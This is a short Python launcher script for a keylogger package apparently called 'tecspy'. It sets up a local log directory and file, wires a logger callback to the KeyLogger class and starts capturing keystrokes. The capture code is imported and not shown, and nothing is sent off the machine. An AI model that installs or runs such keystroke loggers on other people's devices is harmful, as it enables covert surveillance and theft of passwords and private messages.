from tecspy.keylogger import KeyLogger
from tecspy.logger import Logger
from tecspy.config import LOG_FILE_PATH
from tecspy.utils import create_log_directory
import os

# Defina o diretório de logs e screenshots de forma relativa
project_root = os.path.dirname(os.path.abspath(__file__))  # Diretório do projeto
log_directory = os.path.join(project_root, 'logs')

create_log_directory(log_directory)

# Atualiza o caminho do arquivo de log para ser relativo
LOG_FILE_PATH = os.path.join(log_directory, 'keylogger.log')

# Inicializa o logger
logger = Logger(LOG_FILE_PATH)

# Inicializa o keylogger
keylogger = KeyLogger(log_callback=logger.log_key)

# Inicia o keylogger
if __name__ == "__main__":
    keylogger.start()
